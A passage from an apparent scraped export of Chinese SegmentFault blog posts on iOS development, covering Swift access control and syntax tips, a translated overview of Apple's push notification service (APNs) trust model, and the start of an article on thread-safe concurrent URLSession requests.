    return self;
}

@end

// 编译错误：
// Assignment to readonly property</code></pre>
<p>这时候我们就会在内部的 <code>extension</code> 重新声明一个 <code>readwrite</code>的同样的属性，也就是<strong>“外部只读，内部可写”</strong>：</p>
<pre><code class=""objc"">@interface Person ()

@property (nonatomic, readwrite, copy) NSString *name;

@end
</code></pre>
<p>在 Swift 中，我们可能有同样的场景。这里就不得不提到 <code>private</code> 和 <code>fileprivate</code> 关键字了。<br><code>private</code>表示声明为私有的实体只能在其声明的范围内被访问。比如我在 <code>MyClass</code> 中声明了一个私有的 <code>name</code> 属性，外部访问的话会编译错误：</p>
<pre><code class=""swift"">class MyClass {
    private var name: String = ""Test""
}

class ViewController: UIViewController {
    
    override func viewDidLoad() {
        super.viewDidLoad()

        let only = MyClass()
        print(only.name) 
        only.name = ""ifelseboyxxv587""       
    }
}

// 编译异常：
// 'name' is inaccessible due to 'private' protection level</code></pre>
<p>而 <code>fileprivate</code>，看命名我们大概能猜到，就是将对实体的访问权限于它声明的源文件。通俗点讲，比如我上面的代码都是在 <code>ViewController.swift</code> 这个文件里的，我把 <code>private</code> 修改为 <code>fileprivate</code>，就不会编译错误了：</p>
<pre><code class=""swift"">class MyClass {
    fileprivate var name: String = ""Test""
}</code></pre>
<p>那么如果非 <code>ViewController.swift</code> 文件，也想访问 <code>MyClass</code> 的 <code>name</code> 属性该怎么办呢？我们可以把 <code>name</code> 属性声明为 <code>fileprivate(set)</code>，就要就达到类似 Objective-C 中的 <code>readonly</code> 效果了 ：</p>
<pre><code class=""swift"">// ViewController.swift 文件

class MyClass {
    fileprivate(set) var name: String = ""Test""
}

class ViewController: UIViewController {
    
    override func viewDidLoad() {
        super.viewDidLoad()

        let only = MyClass()
        print(only.name)
        only.name = ""ifelseboyxxv587""
        print(only.name)
    }
}

// 编译正常，ViewController.swift 文件内可读可写
// 输出：
// Test
// ifelseboyxxv587</code></pre>
<pre><code class=""swift"">// AppDelegate.swift 文件

func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool {
        // Override point for customization after application launch.

    let only = MyClass()
    print(only.name) //只能读
    only.name = ""ifelseboyxxv587"" //这里报错，不能写
        
    return true
}

// 编译异常：
// Cannot assign to property: 'name' setter is inaccessible</code></pre>
<h2>作用域：do 语句块</h2>
<p>在 Objective-C 中，我们可以利用 <code>{}</code> 来开辟新的作用域，来避免对象名称重复的问题：</p>
<pre><code class=""objc"">NSString *ha = @""测试一"";
    
{
    NSString *ha = @""测试二"";
    NSLog(@""%@"",ha);
}
    
NSLog(@""%@"",ha);

// 输出：
// 2017-12-11 16:55:20.303132+0800 Demo[48418:93027416] 测试二
// 2017-12-11 16:55:20.303316+0800 Demo[48418:93027416] 测试一</code></pre>
<p>在 Swift 中，取代 <code>{}</code> 的是 <code>do {}</code>：</p>
<pre><code class=""swift"">let ha = ""测试一""
        
do {
    let ha = ""测试二""
    print(ha)
}
        
print(ha)

// 输出：
// 测试二
// 测试一</code></pre>
<h2>倒序 reversed()</h2>
<p>在 Objective-C 中，我们如果想倒序数组一般这样：</p>
<pre><code class=""objc"">NSArray *array = @[@""1"",@""2"",@""3""];
    
NSArray *reversedArray = [[array reverseObjectEnumerator] allObjects];

// 输出：
// 2017-12-11 17:39:57.127466+0800 Demo[49004:93210504] (
    3,
    2,
    1
)</code></pre>
<p>在 Swift 中，相对简单点：</p>
<pre><code class=""swift"">let arr:[String] = [""1"",""2"",""3""]
let reversedArr:[String] = arr.reversed()

// 输出：
// [""3"", ""2"", ""1""]</code></pre>
<h2>标签语句：指定跳出某个条件语句</h2>
<p>在 Objective-C 中，如果遇到多层嵌套的条件语句，我们如果想要指定跳出某个条件语句是很不方便的。比如有两个循环，<strong>一旦找到它们相同的，就立刻停止循环</strong>，我们可能会这么做：</p>
<pre><code class=""objc"">NSArray *arr1 = @[@""1"",@""2"",@""3"",@""4"",@""5""];
NSArray *arr2 = @[@""4"",@""6"",@""8"",@""9"",@""2""];

BOOL finded = NO;
for (NSString *x in arr1) {
    if (finded) {
        break;
    }
    NSLog(@""x：%@"",x);
    for (NSString *y in arr2) {
        NSLog(@""y：%@"",y);
        if ([x isEqualToString:y]) {
            NSLog(@""找到相等的了：%@"",x);
            finded = YES;
            break;
        }
    }
}</code></pre>
<p>我们需要借助 <code>finded</code> 这个 <code>BOOL</code>，来方便我们跳出循环。在 Swift 中，我们就可以利用标签语句，来指定具体跳出哪个循环，语法是这样的：</p>
<pre><code class=""swift"">标签名: 条件语句 {

}</code></pre>
<p>上面的 ? 我们可以这么写：</p>
<pre><code class=""swift"">let arr1 = [""1"",""2"",""3"",""4"",""5""]
let arr2 = [""4"",""6"",""8"",""9"",""2""]
        
label: for x in arr1 {
    print(""x： \(x)"")
    for y in arr2 {
        print(""y： \(y)"")
        if x == y {
            print(""找到相等的了：\(y)"")
            break label
        }
    }
} </code></pre>
<p>上面代码，我们把第一层循环定义了标签：<code>label</code>。在第二层循环中，一旦条件成立，立刻跳出第一层循环 <code>label</code>。这个特性，可以说十分方便了！</p>
<h2>优雅的定义通知名称</h2>
<p>在 Objective-C 中，我们自定义通知时，对于名称的定义一般都有规范：</p>
<pre><code class=""objc"">// xxx.h 
UIKIT_EXTERN NSString * const XXXXNotification;

// xxx.m 
NSString * const XXXXNotification = @""XXXXNotification"";</code></pre>
<p>在 Swift 中，我们可以参考 <a href=""https://github.com/Alamofire/Alamofire"" rel=""nofollow noreferrer"">Alamofire</a> 的方式，创建个专门存放通知名的文件，扩展 <code>Notification.Name</code> 并以结构体 <code>struct</code> 方式声明：</p>
<pre><code class=""swift"">// XXNotification.swift 文件

import Foundation

extension Notification.Name {
    public struct Task {
        public static let 通知名 = Notification.Name(rawValue: ""org.target名称.notification.name.task.通知名"")
    }
}</code></pre>
<p>然后我们就可以愉快的使用了：</p>
<pre><code class=""swift"">// add
NotificationCenter.default.addObserver(self, selector: #selector(myNotification(_ :)), name: NSNotification.Name.Task.通知名, object: self)

// post
NotificationCenter.default.post(name: NSNotification.Name.Task.通知名, object: self)

// remove
NotificationCenter.default.removeObserver(self, name: NSNotification.Name.Task.通知名, object: self)</code></pre>

                ", Swift 知识小集,1531971910,219,1,168,1,1,https://segmentfault.com/a/1190000012431988
38,1,0,6,"
                    
<blockquote><p>本文是翻译的 <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/APNSOverview.html"" rel=""nofollow noreferrer""><strong>APNs 的官方说明</strong></a></p></blockquote>
<blockquote><p>自己英文不是太好，花了不少时间来翻译，其实之前我是看不进去的。后来发现，只要你一点一点的看，总是能看进去的。</p></blockquote>
<h1>APNs 概述</h1>
<p>APNs (Apple Push Ontification service) 服务是远程通知的核心。该服务健全、安全、高效，开发者可以方便的向 iOS tvOS macOS 终端设备推送通知。</p>
<p>当应用在用户设备上运行的时候会在用户设备和 APNs 之间建立一个安全的数据交互连接。应用通过该连接接收通知。<em>在下面的一节中说明</em></p>
<p>另一半的连接是发送通知的连接，是在你的服务器与 APNs 之间的固定连接，需要在你的开发者帐户中用苹果提供的加密证书配置。本质上讲，信息提供者是一个服务器，是由你配置及部署的，需要你来写服务端的功能。下图显示远程通知的传递过程：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012019287?w=1212&amp;h=202"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""推送工作原理"" title=""推送工作原理""></span></p>
<p>当服务器和手机应用中都配置好了之后，此时服务器可以向 APNs 发送推送请求。APNs 接收并向每个目标设置发送对应的通知信息。在终端设备（iOS macOS tvOS）接收到通知之后，系统把信息传递能你的应用，并管理用户与通知的交互。</p>
<p>如果设备接收到通知的时候，你的应用没有处于运行状态，系统还是能正常的显示通知。<br>如果 APNs 发送通知的时候，终端设备关机了，APNs 会保留通知信息，并在一段时间之后重试。</p>
<h2>服务器的职责</h2>
<p>你的服务器在跟 APNs 沟通连接的时候具有以下责任：</p>
<ul>
<li><p>通过 APNs 接收关于你的app的全球唯一的设备验证码，及其它一些数据</p></li>
<li><p>根据app功能的需要，决定通知推送的时间</p></li>
<li><p>建立通知请求，并发送通知请求到 APNs， APNs 再将通知递送到相应的设备</p></li>
</ul>
<p>对于每一个通知请求，服务器需要做的：</p>
<ol>
<li><p>组建一个 JSON 数据，其中包含通知的信息 <em>具体看下一章节</em></p></li>
<li><p>添加 device token和通知信息到一个 HTTP/2 请求中。<a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/APNSOverview.html#//apple_ref/doc/uid/TP40008194-CH8-SW13"" rel=""nofollow noreferrer"">关于 device token</a> <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/CommunicatingwithAPNs.html#//apple_ref/doc/uid/TP40008194-CH11-SW1"" rel=""nofollow noreferrer"">关于 HTTP/2 参数及回执信息</a></p></li>
<li><p>通过一个永久安全的线路 (<a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/APNSOverview.html#//apple_ref/doc/uid/TP40008194-CH8-SW9)"" rel=""nofollow noreferrer"">Security Architecture</a>，发送包含证书的 HTTP/2 请求到 APNs</p></li>
</ol>
<h2>对于使用多个服务器的</h2>
<p>工作图示如下图<br>多个服务器的时候，每个服务器都需要通过证书或token 连接到 APNs，然后任意一个取得 device token 的服务器就可以发送通知了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012019288?w=1362&amp;h=674"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""多服务器"" title=""多服务器""></span></p>
<h2>服务质量，存储并发送，联合通知</h2>
<p>APNs 的服务质量组件可以实现存储然后发送的功能。当 APNs 发送通知到一个离线设备时，APNs 会把通知存储起来（一定的时间内），当设备上线时再递送给设备。这个存储功能只存储一个设备的一个app的最近的通知。如果设备离线中，发送一个到该设备的通知会消除前面存储的通知。如果设备处于离线太久，所有存储的发往该设备的通知都将被消除。</p>
<p>当发送通知的时候在头部添加合并id，可以使发送的通知合并起来。当 <code>apns-collapse-id</code> 添加到你发送的 HTTP/2 通知请求中时，APNs 合并<code>apns-collapse-id</code>值相同的通知。关于更多<code>apns-collapse-id</code>的知识，<a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/CommunicatingwithAPNs.html#//apple_ref/doc/uid/TP40008194-CH11-SW13"" rel=""nofollow noreferrer"">点此查看</a></p>
<h2>安全结构</h2>
<p>APNs 采用双层信任机制：<code>连接信任</code> 和 <code>device token 信任</code></p>
<h4>
<code>连接信任</code>工作在服务器与 APNs 之间 | APNs 与设备之间</h4>
<p><strong>服务器与APNs之间的信任</strong>确保服务器与 APNs 之间的连接是安全的，你需要根据本节中提到的信息，按步骤确保服务器与 APNs 之间的安全连接<br><strong>APNs与设备之间的信任</strong>确保只有验证的设备才能连接 APNs 收到通知，APNs 自动确保与设备之间的连接是安全正确的。</p>
<p>服务器与 APNs 通信的时候，必须实现 <code>验证证书</code>（基于token的验证）或者 <code>SSL 证书</code>（基于证书的验证）。你在[开发者帐户][]中需要实现这两种验证方式的任意一种，<a href=""http://help.apple.com/xcode/mac/current/#/dev11b059073"" rel=""nofollow noreferrer"">帮助在这</a>。可以查看这里<a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/APNSOverview.html#//apple_ref/doc/uid/TP40008194-CH8-SW4"" rel=""nofollow noreferrer"">服务器与apns连接信任</a>来确定你需要选择哪种验证方式。</p>
<h4>device token 信任</h4>
<p>device token 可以确保通知只在确定的服务器与终端设备之间传送。</p>
<p>device token 是一个不透明的 <code>NSData</code>，包含一个设备上的一个应用的唯一标识。只有 APNs 能解密并查看 device token 中的内容。每个应用在向 APNs 发送远程推送注册请求的时候都会收到自己的 唯一的 device token，然后必须把 device token 转发给你app的服务器（详见 <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/HandlingRemoteNotifications.html#//apple_ref/doc/uid/TP40008194-CH6-SW1"" rel=""nofollow noreferrer"">配置推送支持</a>）。服务器在发送通知到相应的设备时，必须包含对应的 device token。APNs 通过 device token 来确保通知发送到对应设备的对应app中。</p>
<p>APNs 发行新 device token 的原因有：</p>
<ul>
<li><p>用户安装你的app到新设备上</p></li>
<li><p>用户通过备份恢复设备</p></li>
<li><p>用户重装系统后</p></li>
<li><p>其它系统层面的事件</p></li>
</ul>
<p>所以，app在启动的时候必须请求 device token，参阅 <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/APNSOverview.html#//apple_ref/doc/uid/TP40008194-CH8-SW13"" rel=""nofollow noreferrer"">APNs 到设备之间的连接信任 和 device token</a>，看代码实例详见 <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/HandlingRemoteNotifications.html#//apple_ref/doc/uid/TP40008194-CH6-SW3"" rel=""nofollow noreferrer"">推送注册请求</a></p>
<blockquote><p><strong>注意</strong>：为了保护用户隐私，不要用 device token 来标识用户</p></blockquote>
<h3>服务器与 APNs 之间的信任</h3>
<p>服务器与APNs之间有两种方式实现连接信任</p>
<p><strong>基于 Token 的服务器与 APNs 之间的信任</strong> 服务器可以根据 基于HTTP/2 的API 用JSON web tokens (JWT) 来实现与 APNs 之间的连接信任。这这个模式下，你需要提供一个公共密钥给 Apple。服务器需要用该密钥来生成并添加到 JWT 服务器验证 token。 服务器发出的每个推送请求必须包含该 token。</p>
<p>你就能用简单的基于token的连接，来实现在你开发者帐户中的所有应用的推送请求。</p>
<p>服务器向 APNs 发出的每个推送请求，都会收到 APNs 的 HTTP/2 反馈。</p>
<p><strong>基于证书的服务器与 APNs 之间的信任</strong> 服务器也可以通过唯一的证书来实现连接信任。服务器证书可以从开发者帐户中获取到，基于你 app 的唯一的证书。然后就可以使用证书来实现推送请求了。</p>
<blockquote><p><strong>重要</strong><br>为实现与 APNs 之间基于 HTTP/2的 SSL 连接，你的服务器中必须包含 GeoTrust Gloabl CA 作为根证书。如果你的服务器运行的是 macOS，这个根证书在 keychain 中。其它系统的服务器则就个人情况来安装。你可以从 <a href=""https://www.geotrust.com/resources/root-certificates/"" rel=""nofollow noreferrer"">GeoTrust Root Certificates 网站</a>下载，也可以点<a href=""https://www.geotrust.com/resources/root_certificates/certificates/GeoTrust_Global_CA.pem"" rel=""nofollow noreferrer"">这里</a>直接下载证书。</p></blockquote>
<h4>基于 Token 的服务器与 APNs 之间的信任</h4>
<p>Apple Push Notification Authentication Key (Sandbox &amp; Production)<br>你需要在你的[开发者帐户][]中进行配置，具体操作看 <a href=""http://help.apple.com/xcode/mac/current/#/dev11b059073?sub=dev1eb5dfe65"" rel=""nofollow noreferrer"">生成唯一的服务器Token</a><br>这个证书有以下特性：</p>
<ul>
<li><p>一个证书可以用于向所有包含在帐户下的 app 发送推送。同样可用于 voiceover-Internet Protocol(VoIP)。即使在你的app处于后台运行时，APNs 也会向app发送这个证书。详情参见<a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/CommunicatingwithAPNs.html#//apple_ref/doc/uid/TP40008194-CH11-SW5"" rel=""nofollow noreferrer"">APNs 服务器证书</a>，在<a href=""https://developer.apple.com/library/content/documentation/Performance/Conceptual/EnergyGuide-iOS/index.html#//apple_ref/doc/uid/TP40015243"" rel=""nofollow noreferrer"">开发中的能耗指导</a>查看关于<a href=""https://developer.apple.com/library/content/documentation/Performance/Conceptual/EnergyGuide-iOS/OptimizeVoIP.html#//apple_ref/doc/uid/TP40015243-CH30"" rel=""nofollow noreferrer"">Voice Over IP(VoIP)最好的应用</a>的说明</p></li>
<li><p>发送推送请求时，必须在基于 JWT 连接中包含该证书</p></li>
<li><p>认证证书永不失效，但你可以随时通过[开发者帐户][]重新获取，重新获取后旧的证书将不能再使用</p></li>
</ul>
<blockquote><p>下图为： 用 HTTP/2 在服务器与 APNs 之间建立信任连接，用 JWT 向 APNs 发送推送请求</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012019289?w=944&amp;h=675"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""HTTP/2"" title=""HTTP/2""></span></p>
<p>如图所示，工作流程是这样的：</p>
<ol>
<li><p>服务器向 APNs 请求基于 TLS(transport layer security)的安全连接请求</p></li>
<li><p>APNs 向服务器发送认证证书，到这里，服务器与 APNs 之间的连接已经建立，此时可以发送推送请求</p></li>
<li><p>服务器需要发送的每个推送请求必须包含 JWT 认证 token</p></li>
<li><p>APNs 向服务器发送 HTTP/2 回执 参见<a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/CommunicatingwithAPNs.html#//apple_ref/doc/uid/TP40008194-CH11-SW2"" rel=""nofollow noreferrer"">HTTP/2</a></p></li>
</ol>
<h4>基于证书的服务器与 APNs 之间的信任</h4>
<p>基于证书的服务器连接只支持特定的某一个应用。证书需要在你的服务器上根据你的应用 bundle 提前生成，具体参见 <a href=""http://help.apple.com/xcode/mac/current/#/dev11b059073?sub=dev2178d70ae"" rel=""nofollow noreferrer"">生成一个唯一的通往APNs 的 SSL 连接证书</a>。根据你生成的证书的不同，信任的连接也可以推送一些与你app相关的一些东西，如 apple watch 的并发和 VoIP (voice-over-Internet Protocol)。APNs 会传送推送这些，即使设备仅在后台运行。查阅<a href=""http://help.apple.com/xcode/mac/current/#/dev11b059073?sub=dev2178d70ae"" rel=""nofollow noreferrer"">与 APNs 沟通</a>来获取更多知识，在<a href=""https://developer.apple.com/library/content/documentation/Performance/Conceptual/EnergyGuide-iOS/index.html#//apple_ref/doc/uid/TP40015243"" rel=""nofollow noreferrer"">开发中的能耗指导</a>查看关于<a href=""https://developer.apple.com/library/content/documentation/Performance/Conceptual/EnergyGuide-iOS/OptimizeVoIP.html#//apple_ref/doc/uid/TP40015243-CH30"" rel=""nofollow noreferrer"">Voice Over IP(VoIP)最好的应用</a>的说明。</p>
<p>在基于证书的信任连接中，APNs 会持有一个废止的证书列表，如果服务器的证书在这个列表中，APNs 会废止与服务器的信任连接（也就是说 APNs 会拒绝服务器的请求）</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012019290?w=1002&amp;h=678"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""TLS"" title=""TLS""></span></p>
<p>该连接方式的过程是这样的：</p>
<ol>
<li><p>服务器向 APNs 发出 TLS 连接请求</p></li>
<li><p>APNs 把证书发给服务器</p></li>
<li><p>服务器需要把你之前从[开发者帐户][]中生成的证书发给 APNs，具体参见<a href=""http://help.apple.com/xcode/mac/current/#/dev11b059073?sub=dev2178d70ae"" rel=""nofollow noreferrer"">生成一个唯一的通往APNs 的 SSL 连接证书</a></p></li>
<li><p>APNs 验证服务器提供的证书是否正确，如果正确，则确定服务器与 APNs 的信任连接。此时服务器可以向 APNs 发送推送请求了。</p></li>
</ol>
<h3>APNs 与设备之间的连接与 Device Tokens</h3>
<p>APNs 与每个设备之间的连接是自动建立的，这个过程中，不需要你的 app 做什么。</p>
<p>每个设备都有一个加密的证书和私有密钥，在设备激活的时候生成，并保存在设备的 keychain 中，在设备激活的时候，APNs 根据设备的证书和密钥验证并授权与设备之间的连接。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012019291?w=884&amp;h=639"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""APNS - device"" title=""APNS - device""></span><br>过程是这样的：</p>
<ol>
<li><p>设备向 APNs 发送 TLS 连接请求，信任连接设置开始</p></li>
<li><p>APNs 回执 APNs 证书到设备上</p></li>
<li><p>设备操作系统验证接收到的 APNs 证书，并向 APNs 发送自己的设备证书</p></li>
<li><p>APNs 验证设备发来证书，如果正确，信任连接建立</p></li>
</ol>
<p>当设备与 APNs 之间的信任连接建立之后，此时设备可以向 APNs 申请特定 app 的 device-token，具体参阅 <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/HandlingRemoteNotifications.html#//apple_ref/doc/uid/TP40008194-CH6-SW3"" rel=""nofollow noreferrer"">配置远程推送支持</a> 的<code>注册接收远程推送</code>章节。</p>
<p>在收到 device token 之后，app 必须向其服务器发送接收到的 device token。因为服务器之后向 APNs 发送推送请求时需要用到 device token，代码请参阅 <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/HandlingRemoteNotifications.html#//apple_ref/doc/uid/TP40008194-CH6-SW3"" rel=""nofollow noreferrer"">配置远程推送支持</a></p>
<p>设备激活申请 device token，和 APNs 新生成一个 device token 的过程是一样的，如图：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012019292?w=972&amp;h=675"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Device Active"" title=""Device Active""></span></p>
<p>过程：</p>
<ol>
<li><p>app 向 APNs 申请远程推送请求，如果设备已经注册了远程推送请求，并且特定 app 的 device token 并没有变化，则 APNs 会返回已经存在的 device token 到设备上，跳转到<strong>步骤4</strong></p></li>
<li><p>当一个新的设备需要注册推送请求时，APNs 根据接收到的设备证书来生成一个 device token，并回执给设备</p></li>
<li><p>设备系统把接收到的 device token 传给 app 并调用 AppDelegate 方法 <code>application:didRegisterForRemoteNotificationWithDeviceToken:</code></p></li>
<li><p>设备接收到 device token 之后，需要把它按二进制或十六进制的格式发给你的服务器，服务器才能用该 device token 来发送推送请求</p></li>
</ol>
<blockquote><p><strong>重要</strong><br>APNs 提供的 device token 的长度不定，不要强行解码其大小</p></blockquote>
<p>当服务器向 APNs 发送推送请求时，请求中包含中标识唯一设备唯一 app 的 device token，这个过程就是下图中 <code>Token, Payload</code> 过程。APNs 解密 device token 确保推送请求的目标。如果请求的发送者和接收者都合法，APNs 向设备发送请求的推送信息。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012019293?w=1011&amp;h=686"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Device Token"" title=""Device Token""></span></p>
<p>在设备接收到 APNs 发来的推送之后，操作系统会把通知递送给相应的 app。</p>
<h2>准备步骤</h2>
<p>APNs 可用于发布在 iOS 应用商店，tvOS 应用商店， macOS 应用商店中的应用，和企业应用。<br>你的 app 需要编写支持推送的功能。如果你是以团队合作的形式开发，那么大多数配置的过程都由管理来实现。因为需要用到开发者帐户。</p>
<p>想查看更多关于如何配置推送的知识，参阅 <a href=""http://help.apple.com/xcode/mac/current/#/dev11b059073"" rel=""nofollow noreferrer"">配置远程推送通知</a></p>

                ", 苹果远程推送通知 APNs 详解，官方，iOS | Swift | UNNotification,1531971912,396,1,520,1,1,https://segmentfault.com/a/1190000012019282
39,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011591027"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Cover"" title=""Cover""></span></p>
<p>iOS 网络编程有一种常见的场景是：我们需要并行处理二个请求并且在都成功后才能进行下一步处理。下面是部分常见的处理方式，但是在使用过程中也很容易出错：</p>
<ul>
<li>DispatchGroup：通过 GCD 机制将多个请求放到一个组内，然后通过 <strong>DispatchGroup.wait()</strong> 和 <strong>DispatchGroup.notify()</strong> 进行成功后的处理。</li>
<li>OperationQueue：为每一个请求实例化一个 <strong>Operation</strong> 对象，然后将这些对象添加到 <strong>OperationQueue</strong> ，并且根据它们之间的依赖关系决定执行顺序。</li>
<li>同步 DispatchQueue：通过同步队列和 <strong>NSLock</strong> 机制避免数据竞争，实现异步多线程中同步安全访问。</li>
<li>第三方类库：Futures/Promises 以及响应式编程提供了更高层级的并发抽象。</li>
</ul>
<p>在多年的实践过程中，我意识到上面这些方法这些方法都存在一定的缺陷。另外，要想完全正确的使用这些类库还是有些困难。</p>
<h2>并发编程中的挑战</h2>
<p><strong>使用并发的思维思考问题很困难：</strong>大多数时候，我们会按照读故事的方式来阅读代码：从第一行到最后一行。如果代码的逻辑不是线性的话，可能会给我们造成一定的理解难度。在单线程环境下，调试和跟踪多个类和框架的程序执行已经是非常头疼的一件事了，多线程环境下这种情况简直不敢想象。</p>
<p><strong>数据竞争问题：</strong>在多线程并发环境下，数据读取操作是线程安全的而写操作则是非线程安全。如果发生了多个线程同时对某个内存进行写操作的话，则会发生数据竞争导致潜在数据错误。</p>
<p>理解多线程环境下的动态行为本身就不是一件容易的事，找出导致数据竞争的线程就更为麻烦。虽然我们可以通过互斥锁机制解决数据竞争问题，但是对于可能修改的代码来说互斥锁机制的维护会是一件非常困难的事。</p>
<p><strong>难以测试：</strong>并发环境下很多问题并不会在开发过程中显现出来。虽然 Xcode 和 LLVM 提供了 <a href=""https://developer.apple.com/documentation/code_diagnostics/thread_sanitizer"" rel=""nofollow noreferrer"">Thread Sanitizer</a> 这类工具用于检查这些问题，但是这些问题的调试和跟踪依然存在很大的难度。因为并发环境下除了代码本身的影响外，应用也会受到系统的影响。</p>
<h2>处理并发情形的简单方法</h2>
<p>考虑到并发编程的复杂性，我们应该如何解决并行的多个请求？</p>
<p>最简单的方式就是避免编写并行代码而是讲多个请求线性的串联在一起：</p>
<pre><code class=""Swift"">let session = URLSession.shared

session.dataTask(with: request1) { data, response, error in
    // check for errors
    // parse the response data

    session.dataTask(with: request2) { data, response error in
        // check for errors
        // parse the response data

        // if everything succeeded...
        callbackQueue.async {
            completionHandler(result1, result2)
        }
    }.resume()
}.resume()</code></pre>
<p>为了保持代码的简洁，这里忽略了很多的细节处理，例如：错误处理以及请求取消操作。但是这样将并无关联的请求线性排序其实暗藏着一些问题。例如，如果服务端支持 HTTP/2 协议的话，我们就没发利用 HTTP/2 协议中通过同一个链接处理多个请求的特性，而且线性处理也意味着我们没有好好利用处理器的性能。</p>
<h2>关于 URLSession 的错误认知</h2>
<p>为了避免可能的数据竞争和线程安全问题，我将上面的代码改写为了嵌套请求。也就是说如果将其改为并发请求的话：请求将不能进行嵌套，两个请求可能会对同一块内存进行写操作而数据竞争非常难以重现和调试。</p>
<p>解决改问题的一个可行办法是通过锁机制：在一段时间内只允许一个线程对共享内存进行写操作。锁机制的执行过程也非常简单：请求锁、执行代码、释放锁。当然要想完全正确使用锁机制还是有一些技巧的。</p>
<p>但是根据 URLSession 的<a href=""https://developer.apple.com/documentation/foundation/urlsession/1411597-init"" rel=""nofollow noreferrer"">文档</a>描述，这里有一个并发请求的更简单解决方案。</p>
<blockquote>
<pre><code class=""Swift"">init(configuration: URLSessionConfiguration,
          delegate: URLSessionDelegate?,
          delegateQueue queue: OperationQueue?)</code></pre>
<p><br>[…]<br><br>queue : An operation queue for scheduling the delegate calls and completion handlers. The queue should be a serial queue, in order to ensure the correct ordering of callbacks. If nil, the session creates a serial operation queue for performing all delegate method calls and completion handler calls.</p>
</blockquote>
<p>这意味所有 URLSession 的实例对象包括 <em>URLSession.shared</em> 单例的回调并不会并发执行，除非你明确的传人了一个并发队列给参数 <em>queue</em> 。</p>
<h2>URLSession 拓展并发支持</h2>
<p>基于上面对 URLSession 的新认知，下面我们对其进行拓展让它支持线程安全的并发请求（完成代码<a href=""https://gist.github.com/sharplet/37210c02aa9e525b55f823bb67712725"" rel=""nofollow noreferrer"">地址</a>）。</p>
<pre><code class=""Swift"">enum URLResult {
    case response(Data, URLResponse)
    case error(Error, Data?, URLResponse?)
}

extension URLSession {
    @discardableResult
    func get(_ url: URL, completionHandler: @escaping (URLResult) -&gt; Void) -&gt; URLSessionDataTask
}

// Example

let zen = URL(string: ""https://api.github.com/zen"")!
session.get(zen) { result in
    // process the result
}</code></pre>
<p>首先，我们使用了一个简单的 <em>URLResult</em> 枚举来模拟我们可以在 <em>URLSessionDataTask</em> 回调中获得的不同结果。该枚举类型有利于我们简化多个并发请求结果的处理。这里为了文章的简洁并没有贴出 <em>URLSession.get(_:completionHandler:)</em> 方法的完整实现，该方法就是使用 GET 方法请求对应的 URL 并自动执行 <em>resume()</em> 最后将执行结果封装成  <em>URLResult</em> 对象。</p>
<pre><code class=""Swift"">@discardableResult
func get(_ left: URL, _ right: URL, completionHandler: @escaping (URLResult, URLResult) -&gt; Void) -&gt; (URLSessionDataTask, URLSessionDataTask) {
    
}</code></pre>
<p>该段 API 代码接受两个 URL 参数并返回两个 <em>URLSessionDataTask</em> 实例。下面代码是函数实现的第一段：</p>
<pre><code class=""Swift""> precondition(delegateQueue.maxConcurrentOperationCount == 1,
      ""URLSession's delegateQueue must be configured with a maxConcurrentOperationCount of 1."")</code></pre>
<p>因为在实例化 URLSession 对象时依旧可以传入并发的 <em>OperationQueue</em> 对象，所以这里我们需要使用上面这段代码将这种情况排除掉。</p>
<pre><code class=""Swift"">var results: (left: URLResult?, right: URLResult?) = (nil, nil)

func continuation() {
    guard case let (left?, right?) = results else { return }
    completionHandler(left, right)
}</code></pre>
<p>将这段代码继续添加到实现中，其中定义了一个表示返回结果的元组变量 <em>results</em> 。另外，我们还在函数内部定义了另一个工具函数用于检查是否两个请求都已经完成结果处理。</p>
<pre><code class=""Swift"">let left = get(left) { result in
    results.left = result
    continuation()
}

let right = get(right) { result in
    results.right = result
    continuation()
}

return (left, right)</code></pre>
<p>最后将这段代码追加到实现中，其中我们分别对两个 URL 进行了请求并在请求都完成后一次返回了结果。值得注意的是这里我们通过两次执行 <em>continuation()</em> 来判断请求是否全部完成：</p>
<ol>
<li>第一次执行 <em>continuation()</em>  时因为其中一个请求并未完成结果为 <em>nil</em> 所以回调函数并不会执行。</li>
<li>第二次执行的时候两个请求全部完成，执行回调处理。</li>
</ol>
<p>接下来我们可以通过简单的请求来测试下这段代码：</p>
